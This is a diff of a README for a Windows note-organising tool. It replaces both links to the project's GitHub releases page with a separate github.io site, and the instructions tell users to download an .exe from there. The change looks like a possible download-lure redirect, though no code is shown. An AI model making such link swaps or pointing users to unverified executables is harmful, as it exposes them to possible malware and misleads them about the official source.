@@ -1,6 +1,6 @@
 # 🪐 knowledge-gravity-lab - Organize your notes with scientific clarity
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Pitangakeratocele862/knowledge-gravity-lab/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://pitangakeratocele862.github.io)
 
 ## What is this tool? 🛠️
 
@@ -21,7 +21,7 @@ Many people collect notes but struggle to manage them. Over time, your note vaul
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Pitangakeratocele862/knowledge-gravity-lab/releases).
+1. Visit the [official releases page](https://pitangakeratocele862.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe.
 4. Save the file to your desktop or your downloads folder.
